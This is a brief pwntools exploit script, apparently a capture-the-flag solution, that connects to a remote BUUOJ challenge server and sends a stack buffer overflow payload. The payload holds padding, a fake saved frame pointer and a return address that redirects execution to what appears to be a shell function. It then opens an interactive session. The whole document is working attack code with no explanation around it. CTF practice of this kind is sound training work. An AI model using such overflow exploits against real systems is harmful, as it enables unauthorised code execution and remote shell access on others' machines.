from pwn import *

r = remote('node5.buuoj.cn', 26893)

shell_addr = 0x804851B

payload = b'A' * 0x18 + p32(0) + p32(shell_addr)
r.sendline(payload)
r.interactive()
